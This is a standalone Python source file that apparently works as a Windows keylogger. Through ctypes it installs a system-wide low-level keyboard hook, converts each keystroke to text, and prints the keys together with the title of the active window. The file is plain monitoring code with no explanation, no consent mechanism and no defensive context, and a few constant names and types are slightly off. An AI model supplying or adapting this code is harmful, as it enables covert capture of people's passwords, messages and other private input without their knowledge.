from ctypes import *
from ctypes import wintypes

# Load necessary functions from user32.dll
user32 = windll.user32

# Define necessary constants and types
LRESULT = c_long
WH_KEYBOARD_LL = 13

WM_KEYDOWN = 0x0100
WM_RETURN = 0x0D
WM_SHIFT = 0x10

# Function definitions from Win32 API

# GetWindowTextLengthA retrieves the length of the text of the specified window's title bar (if it has one).
GetWindowTextLengthA = user32.GetWindowTextLengthA
GetWindowTextLengthA.argtypes = (wintypes.HANDLE,)
GetWindowTextLengthA.restype = wintypes.INT

# GetWindowTextA retrieves the text of the specified window's title bar (if it has one).
GetWindowTextA = user32.GetWindowTextA
GetWindowTextA.argtypes = (wintypes.HANDLE, wintypes.LPSTR, wintypes.INT)
GetWindowTextA.restype = wintypes.INT

# GetKeyState retrieves the status of the specified virtual key.
GetKeyState = user32.GetKeyState
GetKeyState.argtypes = (wintypes.INT,)
GetKeyState.restype = wintypes.SHORT

# GetKeyboardState retrieves the status of the 256 virtual keys.
keyboard_state = wintypes.BYTE * 256
GetKeyboardState = user32.GetKeyboardState
GetKeyboardState.argtypes = (POINTER(keyboard_state),)
GetKeyboardState.restype = wintypes.BOOL

# ToAscii translates the specified virtual-key code and keyboard state to the corresponding character or characters.
ToAscii = user32.ToAscii
ToAscii.argtypes = (wintypes.UINT, wintypes.UINT, POINTER(keyboard_state), wintypes.LPWORD, wintypes.UINT)
ToAscii.restype = wintypes.INT

# CallNextHookEx passes the hook information to the next hook procedure in the current hook chain.
CallNextHookEx = user32.CallNextHookEx
CallNextHookEx.argtypes = (wintypes.HHOOK, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
CallNextHookEx.restype = LRESULT

# SetWindowsHookExA installs an application-defined hook procedure into a hook chain.
SetWindowsHookExA = user32.SetWindowsHookExA
SetWindowsHookExA.argtypes = (wintypes.INT, CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM), wintypes.HINSTANCE, wintypes.DWORD)
SetWindowsHookExA.restype = wintypes.HHOOK

# GetMessageA retrieves a message from the calling thread's message queue.
GetMessageA = user32.GetMessageA
GetMessageA.argtypes = (wintypes.LPMSG, wintypes.HWND, wintypes.UINT, wintypes.UINT)
GetMessageA.restype = wintypes.BOOL

# Define a structure to represent the keyboard hook structure
class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [("vkCode", wintypes.DWORD),
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", wintypes.DWORD)]

# Define a function to get the name of the foreground process
def get_foreground_process():
    hwnd = user32.GetForegroundWindow()
    length = GetWindowTextLengthA(hwnd)
    buff = create_string_buffer(length + 1)
    GetWindowTextA(hwnd, buff, length + 1)
    return buff.value

# Define the hook function
def hook_function(nCode, wParam, lParam):
    global last
    if last != get_foreground_process():
        last = get_foreground_process()
        print("\n[{}]".format(last.decode("latin-1")))
    
    # If a key has been pressed
    if wParam == WM_KEYDOWN:
        keyboard = KBDLLHOOKSTRUCT.from_address(lParam)

        state = (wintypes.BYTE * 256)()
        GetKeyState(WM_SHIFT)
        GetKeyboardState(byref(state))

        # Check which key has been pressed
        buf = (c_ushort * 1)()
        n = ToAscii(keyboard.vkCode, keyboard.scanCode, state, buf, 0)
        # Based on the return value of ToAscii function
        if n > 0:
            if keyboard.vkCode == WM_RETURN:
                print()
            else:
                print("{}".format(string_at(buf).decode("latin-1")), end="", flush=True)
    
    return CallNextHookEx(hook, nCode, wParam, lParam)

# Initialize necessary variables
last = None
callback = CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)(hook_function)

# Set up the keyboard hook
hook = SetWindowsHookExA(WH_KEYBOARD_LL, callback, 0, 0)

# Enter the message loop to keep the hook active
GetMessageA(byref(wintypes.MSG()), 0, 0, 0)
